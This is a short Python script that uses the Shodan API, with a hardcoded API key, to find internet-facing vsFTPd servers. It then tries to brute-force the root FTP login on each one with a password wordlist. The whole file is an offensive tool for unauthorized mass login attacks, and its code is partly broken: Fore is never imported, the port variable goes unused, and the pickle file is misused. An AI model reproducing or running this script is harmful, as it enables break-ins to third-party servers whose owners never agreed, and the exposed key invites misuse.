import shodan
import pickle
import time
import ftplib

SHODAN_API_KEY = "PSKINdQe1GyxGgecYz2191H2JoS9qvgD"
api = shodan.Shodan(SHODAN_API_KEY)

def Search():
    results = api.search('port:"21" product:"vsFTPd"')
    for result in results['matches']:
        print ('%s' % result['ip_str'])
        IPs = '%s' % result['ip_str']
        with open(str("ip"), 'wb') as ip:
            pickle.dump(IPs, ip)

def brute():
    with open(str("ip"), 'rb') as bd:
        for userhost in bd:
            userlogin = "root"
            userword = input ("Input PassList : ")
            wordlist = open(userword,"r",encoding='utf-8', errors='ignore')
            for line in wordlist:
                try:
                    port = "2121"
                    conect = ftplib.FTP(userhost)
                    ans = conect.login(userlogin.strip(), line.strip())
                    
                    if ans ==  "230 Login successful.":
                        print (Fore.GREEN + userhost + " PassFound ", line)
                        break 
                except ftplib.error_perm:  
                    print (Fore.RED + "PassErr", line)
        with open(str("Output"), 'rb') as bd:
            data_new = pickle.load(bd)
            print (data_new)

Search()
brute()
    